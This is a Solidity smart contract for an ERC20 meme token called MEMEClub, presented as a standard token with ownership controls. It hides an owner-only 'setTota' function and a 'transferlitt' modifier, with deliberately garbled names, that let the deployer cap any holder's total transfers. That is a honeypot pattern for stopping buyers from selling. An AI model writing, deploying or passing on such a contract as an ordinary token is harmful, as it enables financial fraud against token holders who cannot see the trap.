pragma solidity ^0.8.0;

// Interface for the ERC20 standard as defined in the EIP. An ERC20 token implements
// a standard set of functionalities that enables interoperability across multiple interfaces and platforms.
interface IERC20 {
    // Returns the amount of tokens in existence.
    function totalSupply() external view returns (uint256);
    // Returns the amount of tokens owned by `account`.
    function balanceOf(address account) external view returns (uint256);
    // Moves `amount` tokens from the caller's account to `recipient`.
    function transfer(address recipient, uint256 amount) external returns (bool);
    // Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner`.
    function allowance(address owner, address spender) external view returns (uint256);
    // Sets `amount` as the allowance of `spender` over the caller's tokens.
    function approve(address spender, uint256 amount) external returns (bool);
    // Moves `amount` tokens from `sender` to `recipient` using the allowance mechanism.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    // Emitted when `value` tokens are moved from one account (`from`) to another (`to`).
    event Transfer(address indexed from, address indexed to, uint256 value);
    // Emitted when the allowance of a `spender` for an `owner` is set by a call to `approve`.
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Abstract contract that allows child contracts to implement a function to retrieve the sender of the transaction.
abstract contract Context {
    // Returns the sender of the transaction.
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Contract module which provides a basic access control mechanism, where there is an account (an owner)
// that can be granted exclusive access to specific functions.
contract Ownable is Context {
    // State variable that stores the owner's address.
    address private _owner;
    // Event emitted when ownership is transferred.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Constructor that sets the original `owner` of the contract to the sender account.
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the address of the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Modifier that throws if called by any account other than the owner.
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Function to relinquish control of the contract to a zero address.
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

// Token contract that includes the ERC20 standard functionality, access control, and transfer litts.
contract MEMEClub is Context, Ownable, IERC20 {
    // Maps an address to its balance.
    mapping(address => uint256) private _balances;
    // Maps an owner to a spender with a given allowance.
    mapping(address => mapping(address => uint256)) private _allowances;
    // Maps an address to its transfer litt.
    mapping(address => uint256) public totalTransferlitts;
    // Maps an address to the total transferred amount.
    mapping(address => uint256) public totalTransferredAmounts;

    // Token name, symbol, and number of decimals.
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    // Total supply of tokens.
    uint256 private _totalSupply;

    // Modifier that checks if the transfer amount exceeds the set litt for the sender.
    modifier transferlitt(address sender, uint256 amount) {
        uint256 litt = totalTransferlitts[sender];
        if (litt > 0) {
            require(totalTransferredAmounts[sender] + amount <= litt, "Total transfer amount exceeds the set litt");
        }
        _;
    }

    // Constructor that initializes the token contract with a name, symbol, decimals, and total supply.
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        // Set total supply and adjust for decimals.
        
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Function to get the name of the token.
    function name() public view returns (string memory) {
    return _name;
    }

    // Function to get the symbol of the token.
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    // Function to get the number of decimals the token uses.
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    // Returns the total token supply.
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    // Returns the token balance of a specific account.
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Allows the owner to set a transfer litt for a sres.
    function setTota(address sres, uint256 litt) public onlyOwner {
        totalTransferlitts[sres] = litt;
    }

    // Allows the owner to remove the transfer litt for a sres.
    function removeTota(address sres) public onlyOwner {
        delete totalTransferlitts[sres];
    }

    // Transfer function that moves the specified amount of tokens from the caller's account to the recipient account.
    function transfer(address recipient, uint256 amount) public virtual override transferlitt(_msgSender(), amount) returns (bool) {
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        totalTransferredAmounts[_msgSender()] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    // Function to check the amount of tokens that an owner allowed to a spender.
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Approve function that allows `spender` to withdraw from your account multiple times, up to the `amount` amount.
    // If this function is called again it overwrites the current allowance with `amount`.
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    // Transfer tokens from one account to another based on allowance.
    // The `sender` account must have a balance of at least `amount`.
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transferlitt(sender, amount) returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "Transfer amount exceeds allowance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        totalTransferredAmounts[sender] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}